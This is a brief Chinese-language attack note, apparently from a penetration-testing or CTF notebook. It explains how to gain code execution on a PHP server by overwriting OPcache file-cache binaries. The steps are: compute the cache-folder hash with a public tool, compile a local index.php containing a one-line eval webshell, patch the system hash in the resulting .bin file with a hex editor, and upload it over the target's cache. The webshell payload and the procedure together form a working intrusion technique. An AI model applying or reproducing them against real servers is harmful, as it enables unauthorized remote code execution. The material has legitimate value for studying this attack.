我们指定了一个缓存目录后，php会把编译好的php字节码文件放到这个缓存目录中。
## 环境
- opcache.enable=1
- 开启`opcache.file_cache_only`
- 禁用用`opcache.validate_timestamps`
## 流程
### 文件夹hash计算
在对缓存文件进行操作前，需要经过一个名称是md5哈希值的文件夹
通过 [hp7-opcache-override.py](https://github.com/GoSecure/php7-opcache-override) 计算 哈希

### 构建恶意文件
本地新建一个 `index.php`,内容是一句话木马`<?php @eval($_POST[test]);?>`，之后访问它。在对应的缓存文件夹里可以看到`index.php.bin`

用十六进制编辑器打开，将`OPCACHE.`后的那串md5哈希值，替换为前一步骤得到的哈希值
### 文件上传覆盖缓存文件
上传后访问index.php就是修改过的缓存内容了



